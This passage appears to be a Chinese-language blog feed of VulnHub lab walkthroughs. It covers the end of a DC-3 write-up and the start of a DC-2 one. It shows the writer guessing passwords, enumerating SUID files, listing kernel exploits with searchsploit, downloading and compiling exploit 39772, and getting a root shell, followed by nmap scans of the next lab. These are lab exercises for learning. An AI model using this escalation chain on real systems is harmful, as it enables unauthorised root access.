failure<br>www-data@DC-3:/tmp$ su -<br>su -<br>Password: snoopy<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su dc3<br>su dc3<br>Password: snoopy<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su dc3<br>su dc3<br>Password: squires<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su dc3<br>su dc3<br>Password: 7M6S1HqGMvt1JYkY<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure><p>进数据库看看也没什么收获，之前 sqlmap 已经把最关键的信息拿到了。</p><p>看看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/home$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>看看 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/home$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>       91     44 -rwsr-xr-x   1 root     root        43316 May  8  2014 /bin/ping6<br>     3560    156 -rwsr-xr-x   1 root     root       157424 Mar 15  2019 /bin/ntfs-3g<br>      125     28 -rwsr-xr-x   1 root     root        26492 Apr 14  2016 /bin/umount<br>    59924     40 -rwsr-xr-x   1 root     root        38900 May 17  2017 /bin/su<br>     2220     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount<br>       76     36 -rwsr-xr-x   1 root     root        34812 Apr 14  2016 /bin/mount<br>       90     40 -rwsr-xr-x   1 root     root        38932 May  8  2014 /bin/ping<br>   139240    104 -rwsr-sr-x   1 root     root       105004 Mar 19  2019 /usr/lib/snapd/snap-confine<br>   142376     16 -rwsr-xr-x   1 root     root        13960 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>     8400     40 -rwsr-xr-x   1 root     root        38300 Mar  8  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic<br>   139221    504 -rwsr-xr-x   1 root     root       513528 Mar  5  2019 /usr/lib/openssh/ssh-keysign<br>   138602     48 -rwsr-xr--   1 root     messagebus    46436 Oct 12  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     9572      8 -rwsr-xr-x   1 root     root           5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>    35876     52 -rwsr-xr-x   1 root     root          53128 May 17  2017 /usr/bin/passwd<br>     8592     36 -rwsr-xr-x   1 root     root          36288 May 17  2017 /usr/bin/newgidmap<br>    35873     80 -rwsr-xr-x   1 root     root          78012 May 17  2017 /usr/bin/gpasswd<br>     9659    160 -rwsr-xr-x   1 root     root         159852 May 29  2017 /usr/bin/sudo<br>    12604     20 -rwsr-xr-x   1 root     root          18216 Jan 15  2019 /usr/bin/pkexec<br>    35872     40 -rwsr-xr-x   1 root     root          39560 May 17  2017 /usr/bin/chsh<br>    35874     48 -rwsr-xr-x   1 root     root          48264 May 17  2017 /usr/bin/chfn<br>     8591     36 -rwsr-xr-x   1 root     root          36288 May 17  2017 /usr/bin/newuidmap<br>    59923     36 -rwsr-xr-x   1 root     root          34680 May 17  2017 /usr/bin/newgrp<br>    39144     52 -rwsr-sr-x   1 daemon   daemon        50748 Jan 15  2016 /usr/bin/at<br></code></pre></td></tr></table></figure><h3 id="尝试-prng-碰撞"><a href="#尝试-prng-碰撞" class="headerlink" title="尝试 prng 碰撞"></a>尝试 prng 碰撞</h3><p>去 gtfobins 中简单对照了一下，没有可以直接利用的点。接下来我又翻了各个文件夹，包括 dc3 用户家目录、网站目录，防止有隐藏文件，不过依然没有收获。也尝试了 <code>ps aux</code>, <code>netstat ano</code> 依然没收获，还尝试了 ssh 公钥<code>prng</code>碰撞。最后开始尝试内核提权和 <code>linpeas</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ searchsploit Kernel 4.4 Privilege Escalation <br>---------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                    |  Path<br>---------------------------------------------------------------------------------- ---------------------------------<br>Apple macOS &lt; 10.12.2 / iOS &lt; 10.2 - Broken Kernel Mach Port Name uref Handling P | macos/local/40957.c<br>Jungo DriverWizard WinDriver &lt; 12.4.0 - Kernel Out-of-Bounds Write Privilege Esca | windows/local/42625.py<br>Jungo DriverWizard WinDriver &lt; 12.4.0 - Kernel Pool Overflow / Local Privilege Es | windows/local/42624.py<br>Jungo DriverWizard WinDriver &lt; 12.4.0 - Kernel Pool Overflow / Local Privilege Es | windows/local/42665.py<br>Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Local Privilege Escalation         | solaris/local/15962.c<br>Linux Kernel 2.4.4 &lt; 2.4.37.4 / 2.6.0 &lt; 2.6.30.4 - <span class="hljs-string">&#x27;Sendpage&#x27;</span> Local Privilege Esc | linux/local/19933.rb<br>Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4 | linux/local/9479.c<br>Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)  | linux_x86/local/9542.c<br>Linux Kernel 2.6.19 &lt; 5.9 - <span class="hljs-string">&#x27;Netfilter Local Privilege Escalation                 | linux/local/50135.c</span><br><span class="hljs-string">Linux Kernel 3.11 &lt; 4.8 0 - &#x27;</span>SO_SNDBUFFORCE<span class="hljs-string">&#x27; / &#x27;</span>SO_RCVBUFFORCE<span class="hljs-string">&#x27; Local Privilege E | linux/local/41995.c</span><br><span class="hljs-string">Linux Kernel 4.4 (Ubuntu 16.04) - &#x27;</span>BPF<span class="hljs-string">&#x27; Local Privilege Escalation (Metasploit)   | linux/local/40759.rb</span><br><span class="hljs-string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="hljs-string">&#x27; Race Condition Privi | linux_x86-64/local/40871.c</span><br><span class="hljs-string">Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation               | linux/local/41458.c</span><br><span class="hljs-string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &#x27;</span>target_offset<span class="hljs-string">&#x27; Out-of-Bound | linux_x86-64/local/40049.c</span><br><span class="hljs-string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - &#x27;</span>AF_PACKET<span class="hljs-string">&#x27; Race Cond | windows_x86-64/local/47170.c</span><br><span class="hljs-string">Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | linux/local/39277.c</span><br><span class="hljs-string">Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | linux/local/40003.c</span><br><span class="hljs-string">Linux Kernel 4.4.x (Ubuntu 16.04) - &#x27;</span>double-fdput()<span class="hljs-string">&#x27; bpf(BPF_PROG_LOAD) Privilege | linux/local/39772.txt</span><br><span class="hljs-string">Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                        | linux/local/41886.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation         | arm/local/31574.c</span><br><span class="hljs-string">Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation                      | linux/local/43345.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.11.8 - &#x27;</span>mq_notify: double sock_put()<span class="hljs-string">&#x27; Local Privilege Escalation | linux/local/45553.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | linux/local/44298.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;</span>netfilter target_offset<span class="hljs-string">&#x27; Local Priv | linux_x86-64/local/44300.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | linux/local/43418.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | linux/local/47169.c</span><br><span class="hljs-string">Sony Playstation 4 (PS4) &lt; 7.02 / FreeBSD 9 / FreeBSD 12 - &#x27;</span>ip6_setpktopt<span class="hljs-string">&#x27; Kernel | hardware/local/48644.c</span><br><span class="hljs-string">---------------------------------------------------------------------------------- ---------------------------------</span><br><span class="hljs-string">Shellcodes: No Results</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>根据 4.4.0-21 的内核版本号，以及 <code>/etc/issue</code> 展示出的 <code>Ubuntu 16.04</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp$ <span class="hljs-built_in">cat</span> /etc/issue<br><span class="hljs-built_in">cat</span> /etc/issue<br>Ubuntu 16.04 LTS \n \l<br></code></pre></td></tr></table></figure><p>我依次尝试了，除此之外还尝试了 linpeas 给出的可能性比较高的脏牛漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span> (Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span>) - &#x27;BPF&#x27; Local Privilege Escalation (Metasploit)   | linux/local/<span class="hljs-number">40759</span>.rb<br><br><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span> (Ubuntu <span class="hljs-number">14</span>.<span class="hljs-number">04</span>/<span class="hljs-number">16</span>.<span class="hljs-number">04</span> x86-<span class="hljs-number">64</span>) - &#x27;AF_PACKET&#x27; Race Condition Privi | linux_x86-<span class="hljs-number">64</span>/local/<span class="hljs-number">40871</span>.c<br><br><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span> (Ubuntu) - DCCP Double-Free Privilege Escalation               | linux/local/<span class="hljs-number">41458</span>.c<br><br><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">21</span> (Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span> x64) - Netfilter &#x27;target_offset&#x27; Out-of-Bound | linux_x86-<span class="hljs-number">64</span>/local/<span class="hljs-number">40049</span>.c<br><br><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">21</span> &lt; <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">51</span> (Ubuntu <span class="hljs-number">14</span>.<span class="hljs-number">04</span>/<span class="hljs-number">16</span>.<span class="hljs-number">04</span> x64) - &#x27;AF_PACKET&#x27; Race Cond | windows_x86-<span class="hljs-number">64</span>/local/<span class="hljs-number">47170</span>.c<br><br><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span> - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | linux/local/<span class="hljs-number">39277</span>.c<br><br><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.x (Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span>) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Privilege | linux/local/<span class="hljs-number">39772</span>.txt<br></code></pre></td></tr></table></figure><p>最后 <code>&#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege</code> 提权成功，按照文件中的步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br>--2023-07-10 23:39:42--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br>Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9<br>Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 7025 (6.9K) [application/octet-stream]<br>Saving to: ‘39772.zip’<br><br>39772.zip                    100%[==============================================&gt;]   6.86K  28.0KB/s    <span class="hljs-keyword">in</span> 0.2s    <br><br>2023-07-10 23:39:43 (28.0 KB/s) - ‘39772.zip’ saved [7025/7025]<br><br><br>┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ unzip 39772.zip                           <br>Archive:  39772.zip<br>   creating: 39772/<br>  inflating: 39772/.DS_Store         <br>   creating: __MACOSX/<br>   creating: __MACOSX/39772/<br>  inflating: __MACOSX/39772/._.DS_Store  <br>  inflating: 39772/crasher.tar       <br>  inflating: __MACOSX/39772/._crasher.tar  <br>  inflating: 39772/exploit.tar       <br>  inflating: __MACOSX/39772/._exploit.tar<br><br>┌──(kali㉿kali)-[~/Downloads/dc_3/39772]<br>└─$ tar xvf exploit.tar <br>ebpf_mapfd_doubleput_exploit/<br>ebpf_mapfd_doubleput_exploit/hello.c<br>ebpf_mapfd_doubleput_exploit/suidhelper.c<br>ebpf_mapfd_doubleput_exploit/compile.sh<br>ebpf_mapfd_doubleput_exploit/doubleput.c<br></code></pre></td></tr></table></figure><p>将文件依次上传到靶机，给予 sh 文件运行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp$ <span class="hljs-built_in">chmod</span> +x compile.sh<br><span class="hljs-built_in">chmod</span> +x compile.sh<br>www-data@DC-3:/tmp$ ./compile.sh<br>./compile.sh<br>doubleput.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;make_setuid&#x27;</span>:<br>doubleput.c:91:13: warning: cast from pointer to <span class="hljs-built_in">integer</span> of different size [-Wpointer-to-int-cast]<br>    .insns = (__aligned_u64) insns,<br>             ^<br>doubleput.c:92:15: warning: cast from pointer to <span class="hljs-built_in">integer</span> of different size [-Wpointer-to-int-cast]<br>    .license = (__aligned_u64)<span class="hljs-string">&quot;&quot;</span><br>               ^<br>www-data@DC-3:/tmp$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 188K<br> 1592 drwxrwxrwt  8 root     root     4.0K Jul 11 13:46 .<br>    2 drwxr-xr-x 22 root     root     4.0K Mar 23  2019 ..<br>63123 drwxrwxrwt  2 root     root     4.0K Jul 11 12:22 .ICE-unix<br>63126 drwxrwxrwt  2 root     root     4.0K Jul 11 12:22 .Test-unix<br>63122 drwxrwxrwt  2 root     root     4.0K Jul 11 12:22 .X11-unix<br>63124 drwxrwxrwt  2 root     root     4.0K Jul 11 12:22 .XIM-unix<br>63125 drwxrwxrwt  2 root     root     4.0K Jul 11 12:22 .font-unix<br> 2193 -rw-r--r--  1 www-data www-data 6.0K Jul 11 13:16 40049.c<br> 2192 -rw-r--r--  1 www-data www-data  16K Jul 11 13:11 41458.c<br> 8618 -rwxr-xr-x  1 www-data www-data  23K Jul 11 13:25 chocobo_root<br> 7188 -rw-r--r--  1 www-data www-data  25K Jul 11 13:24 chocobo_root.c<br> 7189 -rwxr-xr-x  1 www-data www-data  155 Jul 11 13:44 compile.sh<br>  725 -rw-r--r--  1 www-data www-data 2.9K Jul 11 12:12 dirtyc0w.c<br> 8703 -rwxr-xr-x  1 www-data www-data  13K Jul 11 13:46 doubleput<br> 7199 -rw-r--r--  1 www-data www-data 4.1K Jul 11 13:44 doubleput.c<br> 2178 -r-----r--  1 www-data www-data    5 Jul 11 13:08 foo<br> 8699 -rwxr-xr-x  1 www-data www-data 7.9K Jul 11 13:46 hello<br> 7204 -rw-r--r--  1 www-data www-data 2.2K Jul 11 13:44 hello.c<br> 8565 -rwxr-xr-x  1 www-data www-data  18K Jul 11 13:12 pwn<br> 8704 -rwxr-xr-x  1 www-data www-data 7.4K Jul 11 13:46 suidhelper<br> 8406 -rw-r--r--  1 www-data www-data  255 Jul 11 13:44 suidhelper.c<br>63265 drwx------  3 root     root     4.0K Jul 11 12:22 systemd-private-e1ed860c30e54788a139a4c5d9493034-systemd-timesyncd.service-QrMQ7U<br><br></code></pre></td></tr></table></figure><p>虽然有 warning，但是并不妨碍我们得到可执行文件，执行后提权成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp$ ./doubleput<br>./doubleput<br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. <span class="hljs-keyword">if</span> this worked, you<span class="hljs-string">&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="hljs-string">suid file detected, launching rootshell...</span><br><span class="hljs-string">we have root privs now...</span><br><span class="hljs-string">root@DC-3:/tmp# cd /root</span><br><span class="hljs-string">cd /root</span><br><span class="hljs-string">root@DC-3:/root# ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">the-flag.txt</span><br><span class="hljs-string">root@DC-3:/root# cat the-flag.txt</span><br><span class="hljs-string">cat the-flag.txt</span><br><span class="hljs-string"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="hljs-string"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="hljs-string">  \ \ /\ / / _ \ | | | | | |/ _ \| &#x27;</span>_ \ / _ \ | | | |<br>   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|<br>    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)<br>                                                     <br><br>Congratulations are <span class="hljs-keyword">in</span> order.  :-)<br><br>I hope you<span class="hljs-string">&#x27;ve enjoyed this challenge as I enjoyed making it.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If there are any ways that I can improve these little challenges,</span><br><span class="hljs-string">please let me know.</span><br><span class="hljs-string"></span><br><span class="hljs-string">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="hljs-string"></span><br><span class="hljs-string">Have a great day!!!!</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2 靶机</title>
    <link href="/2023/07/4537b1f7b404.html"/>
    <url>/2023/07/4537b1f7b404.html</url>
    
    <content type="html"><![CDATA[<h1 id="DC-靶机"><a href="#DC-靶机" class="headerlink" title="DC-靶机"></a>DC-靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.124                <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 09:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.124<br>Host is up (0.00039s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7744/tcp open  raqmon-pdu<br>MAC Address: 08:00:27:00:39:E2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.50 seconds<br></code></pre></td></tr></table></figure><p>开了两个端口 80 和 7744</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,7744 192.168.56.124                             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 09:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.124<br>Host is up (0.00065s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title: Did not follow redirect to http://dc-2/<br>|_http-server-header: Apache/2.4.10 (Debian)<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br>|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br>|   256 <span class="hljs-built_in">df</span>:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br>|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br>MAC Address: 08:00:27:00:39:E2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.19 seconds<br></code></pre></td></tr></table></figure><p>80 端口重定向到了 dc-2 的域名下，需要我们将映射写入 hosts 文件。7744 是 ssh 服务，debian 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,7744 192.168.56.124                             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 09:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> dc-2 (192.168.56.124)<br>Host is up (0.00053s latency).<br><br>PORT     STATE SERVICE<br>80/tcp   open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: 